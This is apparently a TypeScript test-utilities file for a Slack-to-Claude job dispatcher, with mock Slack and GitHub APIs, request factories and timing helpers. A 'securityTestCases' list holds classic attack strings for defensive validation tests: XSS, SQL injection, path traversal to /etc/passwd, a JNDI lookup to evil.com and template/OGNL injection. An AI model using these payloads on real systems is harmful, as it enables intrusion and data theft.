#!/usr/bin/env bun

/**
 * Test utilities for dispatcher package
 */

import type { WorkerJobRequest } from "../types";

/**
 * Factory for creating mock worker job requests
 */
export function createMockWorkerJobRequest(overrides: Partial<WorkerJobRequest> = {}): WorkerJobRequest {
  return {
    sessionKey: "test-session-123",
    userId: "U123456789",
    username: "testuser",
    channelId: "C123456789",
    threadTs: "1234567890.123456",
    repositoryUrl: "https://github.com/test/repo",
    userPrompt: "Help me with this code",
    slackResponseChannel: "C123456789",
    slackResponseTs: "1234567890.123456",
    claudeOptions: {
      model: "claude-3-sonnet",
      temperature: 0.7,
    },
    recoveryMode: false,
    ...overrides,
  };
}


/**
 * Mock Slack app and event implementations
 */
export const mockSlackApi = {
  app: {
    event: jest.fn(),
    message: jest.fn(),
    command: jest.fn(),
    action: jest.fn(),
    view: jest.fn(),
    start: jest.fn(),
    stop: jest.fn(),
  },
  client: {
    chat: {
      postMessage: jest.fn(),
      update: jest.fn(),
      delete: jest.fn(),
    },
    users: {
      info: jest.fn(),
      profile: {
        get: jest.fn(),
      },
    },
    channels: {
      info: jest.fn(),
    },
    conversations: {
      info: jest.fn(),
      history: jest.fn(),
      replies: jest.fn(),
    },
  },
  event: {
    ack: jest.fn(),
    say: jest.fn(),
    respond: jest.fn(),
    client: null as any,
  },
  command: {
    ack: jest.fn(),
    respond: jest.fn(),
    client: null as any,
  },
  action: {
    ack: jest.fn(),
    respond: jest.fn(),
    client: null as any,
  },
};

/**
 * Mock GitHub API implementations
 */
export const mockGitHubApi = {
  repos: {
    get: jest.fn(),
    getContent: jest.fn(),
    createOrUpdateFileContents: jest.fn(),
  },
  pulls: {
    list: jest.fn(),
    get: jest.fn(),
    create: jest.fn(),
    update: jest.fn(),
  },
  issues: {
    list: jest.fn(),
    get: jest.fn(),
    create: jest.fn(),
    update: jest.fn(),
    createComment: jest.fn(),
  },
  git: {
    createRef: jest.fn(),
    getRef: jest.fn(),
    updateRef: jest.fn(),
  },
};

/**
 * Factory for creating mock Slack events
 */
export function createMockSlackEvent(type: string, overrides: any = {}) {
  const baseEvent = {
    type,
    user: "U123456789",
    channel: "C123456789",
    ts: "1234567890.123456",
    team: "T123456789",
    ...overrides,
  };

  switch (type) {
    case "message":
      return {
        ...baseEvent,
        text: "Hello Claude",
        ...overrides,
      };
    case "app_mention":
      return {
        ...baseEvent,
        text: "<@U987654321> help me with this",
        ...overrides,
      };
    case "member_joined_channel":
      return {
        ...baseEvent,
        user: "U123456789",
        ...overrides,
      };
    default:
      return baseEvent;
  }
}

/**
 * Factory for creating mock Slack commands
 */
export function createMockSlackCommand(overrides: any = {}) {
  return {
    command: "/claude",
    text: "help me debug this",
    user_id: "U123456789",
    user_name: "testuser",
    channel_id: "C123456789",
    channel_name: "general",
    team_id: "T123456789",
    team_domain: "testteam",
    response_url: "https://hooks.slack.com/commands/123/456/789",
    trigger_id: "123.456.789",
    ...overrides,
  };
}


/**
 * Rate limiting test helpers
 */
export const rateLimitTestHelpers = {
  /**
   * Create multiple job requests for the same user to test rate limiting
   */
  createRateLimitRequests(userId: string, count: number): WorkerJobRequest[] {
    return Array.from({ length: count }, (_, i) =>
      createMockWorkerJobRequest({
        userId,
        sessionKey: `rate-limit-test-${i}`,
      })
    );
  },

  /**
   * Mock time advancement for testing rate limit windows
   */
  mockTimeAdvancement(minutes: number) {
    const originalNow = Date.now;
    const advancedTime = originalNow() + minutes * 60 * 1000;
    Date.now = jest.fn().mockReturnValue(advancedTime);
    return () => {
      Date.now = originalNow;
    };
  },
};

/**
 * Security test cases
 */
export const securityTestCases = {
  maliciousInputs: [
    "<script>alert('xss')</script>",
    "'; DROP TABLE users; --",
    "../../../etc/passwd",
    "${jndi:ldap://evil.com/exploit}",
    "{{7*7}}",
    "%{#context['xwork.MethodAccessor.denyMethodExecution']=false}",
  ],

  oversizedInputs: {
    longText: "a".repeat(10000),
    deepObject: JSON.stringify({ nested: { very: { deep: { object: "value" } } } }),
    manyFields: Object.fromEntries(
      Array.from({ length: 1000 }, (_, i) => [`field${i}`, `value${i}`])
    ),
  },
};

/**
 * Performance test utilities
 */
export class PerformanceTracker {
  private metrics: Map<string, number[]> = new Map();

  startTimer(name: string): () => number {
    const start = performance.now();
    return () => {
      const duration = performance.now() - start;
      if (!this.metrics.has(name)) {
        this.metrics.set(name, []);
      }
      this.metrics.get(name)!.push(duration);
      return duration;
    };
  }

  getStats(name: string) {
    const values = this.metrics.get(name) || [];
    if (values.length === 0) return null;

    const sorted = [...values].sort((a, b) => a - b);
    return {
      count: values.length,
      min: sorted[0],
      max: sorted[sorted.length - 1],
      mean: values.reduce((a, b) => a + b, 0) / values.length,
      median: sorted[Math.floor(sorted.length / 2)],
      p95: sorted[Math.floor(sorted.length * 0.95)],
      p99: sorted[Math.floor(sorted.length * 0.99)],
    };
  }

  clear() {
    this.metrics.clear();
  }
}

/**
 * Async test utilities
 */
export const asyncTestUtils = {
  /**
   * Wait for a condition to be true
   */
  async waitFor(
    condition: () => boolean | Promise<boolean>,
    timeout: number = 5000,
    interval: number = 100
  ): Promise<void> {
    const start = Date.now();
    while (Date.now() - start < timeout) {
      if (await condition()) {
        return;
      }
      await new Promise(resolve => setTimeout(resolve, interval));
    }
    throw new Error(`Condition not met within ${timeout}ms`);
  },

  /**
   * Create a delay
   */
  delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  },

  /**
   * Test race conditions
   */
  async testConcurrency<T>(
    tasks: (() => Promise<T>)[],
    expectedResults?: T[]
  ): Promise<T[]> {
    const results = await Promise.allSettled(tasks.map(task => task()));
    
    const fulfilled = results
      .filter((result): result is PromiseFulfilledResult<T> => result.status === "fulfilled")
      .map(result => result.value);

    const rejected = results
      .filter((result): result is PromiseRejectedResult => result.status === "rejected")
      .map(result => result.reason);

    if (rejected.length > 0) {
      console.warn(`${rejected.length} tasks failed:`, rejected);
    }

    if (expectedResults) {
      expect(fulfilled).toEqual(expectedResults);
    }

    return fulfilled;
  },
};

/**
 * Mock environment setup
 */
export function setupMockEnvironment() {
  // Mock environment variables
  process.env.SLACK_BOT_TOKEN = "xoxb-test-token";
  process.env.SLACK_SIGNING_SECRET = "test-signing-secret";
  process.env.GITHUB_TOKEN = "ghp_test_token";
  process.env.GCS_PROJECT_ID = "test-project";

  return () => {
    // Cleanup
    delete process.env.SLACK_BOT_TOKEN;
    delete process.env.SLACK_SIGNING_SECRET;
    delete process.env.GITHUB_TOKEN;
    delete process.env.GCS_PROJECT_ID;
  };
}

/**
 * Test data generators
 */
export const generators = {
  randomUserId: () => `U${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
  randomChannelId: () => `C${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
  randomTeamId: () => `T${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
  randomMessageTs: () => `${Date.now()}.${Math.random().toString().substr(2, 6)}`,
  randomJobName: () => `claude-worker-test-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
  randomSessionKey: () => `test-session-${Date.now()}-${Math.random().toString(36).substr(2, 8)}`,
};